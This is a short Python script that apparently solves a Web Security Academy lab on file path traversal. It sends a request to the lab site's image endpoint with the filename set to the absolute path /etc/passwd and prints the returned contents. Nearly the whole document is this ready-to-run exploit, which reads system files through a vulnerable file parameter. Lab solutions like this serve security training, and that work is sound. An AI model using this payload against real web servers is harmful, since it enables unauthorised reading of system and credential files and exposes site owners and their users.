# Vulnerability :- Path Traversal
# Lab Name :- File path traversal, traversal sequences blocked with absolute path bypass

import requests

url = "https://0a45005203dd95168264a2f00088005d.web-security-academy.net" # Change Me Without Trailing Slashes

def i_am_attacking():
    payload = "/etc/passwd"
    payload_with_url = f"{url}/image?filename={payload}"
    r = requests.get(payload_with_url)
    print()
    print(r.text)
i_am_attacking()